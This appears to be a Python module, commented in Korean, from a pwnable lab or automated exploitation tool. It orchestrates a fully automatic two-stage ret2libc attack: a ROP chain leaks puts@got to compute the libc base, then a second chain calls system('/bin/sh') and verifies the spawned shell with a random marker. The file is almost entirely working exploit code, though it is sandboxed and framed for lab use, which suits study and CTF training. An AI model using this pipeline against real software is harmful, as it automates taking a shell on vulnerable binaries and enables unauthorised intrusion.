"""완전 자동 2단계 ret2libc 오케스트레이션 (leak → libc base → system).

이 코어는 **실행이 일어나는 프로세스**(in-process 러너 또는 컨테이너 안의 CLI)
에서 호출된다. libc 심볼 오프셋은 그 실행 환경의 libc 에서 해석하므로, 컨테이너
executor 에서는 반드시 컨테이너 **안에서** 수행돼야 한다(그래서 서비스가 아니라
여기 sandbox 계층에 둔다).
"""

from __future__ import annotations

import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import is_pie, ret2libc_plan
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox.libc import resolve_libc_symbols
from pwnable_lab.sandbox.runner import SandboxLimits, run_two_stage_shell


def auto_ret2libc(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """단일 바이너리에 대해 leak→base→system→**셸** 2단계 ret2libc 를 자동 수행한다.

    PTY 로 유출을 읽어 libc base 를 계산하고, 2단계 ret2libc 로 ``system("/bin/sh")``
    를 띄운 뒤 spawn 된 셸에 ``echo <marker>`` 를 흘려 **셸 획득을 직접 증명**한다
    (in-process·컨테이너 CLI 모두 로컬 실행이라 동일하게 동작). 반환은 서비스가
    그대로 노출하는 dict. 구성요소·libc 를 못 찾으면 ``attempted=false``.
    """

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if is_pie(image):
        # PIE 는 심볼/가젯이 base 상대라 절대주소 체인을 만들 수 없다(PIE base
        # leak 선행 필요). 정적 플랜을 절대주소로 오용하지 않도록 명시 거부.
        return {"attempted": False, "reason": "pie-needs-base-leak"}
    bplan = ret2libc_plan(image)
    if bplan is None:
        return {"attempted": False, "reason": "no-ret2libc-plan"}
    libc = resolve_libc_symbols()
    if libc is None:
        return {"attempted": False, "reason": "no-libc-symbols"}

    pop, ret = bplan["pop_rdi"], bplan["ret"]
    # prelude: puts(puts@got) 로 런타임 libc 주소 유출 후 재진입(main/vuln).
    prelude = build_overflow(
        offset,
        pop,
        bits=64,
        chain=[
            RopStep(bplan["puts_got"]),
            RopStep(bplan["puts_plt"]),
            RopStep(bplan["return_to"]),
        ],
    )
    captured: dict = {}

    def make_second(first_line: bytes) -> bytes:
        leaked = int.from_bytes(first_line[:6], "little")
        base = leaked - libc["puts"]
        captured.update(leaked=leaked, base=base)
        # stage2 ret2libc: pop rdi → /bin/sh → ret(정렬) → system.
        return build_overflow(
            offset,
            pop,
            bits=64,
            chain=[
                RopStep(base + libc["binsh"]),
                RopStep(ret),
                RopStep(base + libc["system"]),
            ],
        )

    marker = "PWNPILOT_" + secrets.token_hex(4)
    proof, _leaked_line = run_two_stage_shell(
        binary_path,
        make_second,
        marker=marker,
        prelude=prelude,
        limits=limits or SandboxLimits(),
    )

    base = captured.get("base")
    base_ok = base is not None and base > 0 and base % 0x1000 == 0
    succeeded = proof.shell_spawned
    if succeeded:
        reason = "shell-proven"
    elif base_ok:
        reason = "leaked-but-no-shell"
    else:
        reason = "leak-failed"
    return {
        "attempted": True,
        "technique": "ret2libc",
        "libc_path": libc["path"],
        "leaked_puts": captured.get("leaked"),
        "leaked_puts_hex": (
            None if captured.get("leaked") is None else f"0x{captured['leaked']:x}"
        ),
        "libc_base": base,
        "libc_base_hex": None if base is None else f"0x{base:x}",
        "libc_base_page_aligned": base_ok,
        "return_to": bplan["return_to_name"],
        "shell_proven": proof.shell_spawned,
        "succeeded": succeeded,
        "reason": reason,
        "shell_proof": proof.as_dict(),
    }
